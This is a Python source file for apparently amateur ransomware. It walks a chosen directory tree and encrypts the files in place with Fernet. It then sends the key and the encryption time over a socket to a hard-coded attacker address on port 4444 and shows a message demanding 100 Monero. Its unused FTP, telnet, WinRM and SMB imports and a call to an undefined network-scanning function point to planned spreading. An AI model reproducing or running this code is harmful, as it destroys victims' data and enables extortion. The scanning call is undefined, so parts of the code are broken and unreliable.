# Author: SergioZ3R0
#region Imports
import subprocess
import sys
import os
import ctypes
import socket
from datetime import datetime, timedelta
import time
import window

#Install cryptography module
def install(package): # Install the required package
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install('cryptography') # Install the cryptography package
from cryptography.fernet import Fernet
from ftplib import FTP
import telnetlib
import winrm
from smb.SMBConnection import SMBConnection
#endregion
files = [] # List to store the files in the current directory.
def recorrer_arbol_directorios(directory):
    global files
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory, file)
            if not os.path.islink(rute_element):
                if os.path.isdir(rute_element):
                    # Ignora los directorios relacionados con Python
                    if "python" in rute_element.lower():
                        continue
                    print("Directory:", rute_element)
                    recorrer_arbol_directorios(rute_element)
                else:
                    # Ignora los archivos relacionados con Python
                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt" or file == "README.md":
                        continue
                    print("File:", rute_element)
                    files.append(rute_element)
    except Exception as e:
        print("Mondongo")
    print(files)

def send_file_to_host(file_path, host, port): # Send the key file to the attacker
    with open(file_path, 'rb') as file:
        data = file.read()
        print(file)
        print(data)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Create a socket object
        s.connect((host, port)) # Connect to the attacker's server
        s.sendall(data) # Send the file
#### Main

recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))

key = Fernet.generate_key() # Generate a key

with open("key.key", "wb") as key_file: # Open the key file in write binary mode
    key_file.write(key) # Write the key to the file

# Encrypt the files
for file in files:
    try:
        with open(file, "rb") as f: # Open the file in read binary mode
            data = f.read()
        data_encrypted = Fernet(key).encrypt(data) # Encrypt the file
        with open(file, "wb") as f:
            f.write(data_encrypted) # Write the encrypted data to the file
    except Exception as e:
        print(f"Error encrypting file {file}: {e}")

# Store the encryption time
with open("encryption_time.txt", "w") as f:
    f.write(str(datetime.now()))

def unify_files(file1, file2, unified_file):
    with open(file1, 'r') as f1, open(file2, 'r') as f2, open(unified_file, 'w') as uf:
        uf.write(f1.read())
        uf.write('\n')
        uf.write(f2.read())

# Usage
unify_files('key.key', 'encryption_time.txt', 'unified_file.txt')

# Usage: send_file
try:
    send_file_to_host('unified_file.txt', '192.168.1.137', 4444)
except:
    print("Error sending file Unreachable host")


#Delete the randsomware
#os.remove("key.key")
#os.remove("encryption_time.txt")
#os.remove("unified_file.txt")
window.Window()
if sys.platform == "linux":
    subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
else:
    ctypes.windll.user32.MessageBoxW(0, "All file have been encrypted Send me 100 Monero(XMR) to my wallet(WALLET)", "Notification", 1)
print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")

network_prefix="192.168.1"
open_ftp_hosts = scan_network_for_open_ftp(network_prefix)
#os.remove("darthvader.py")
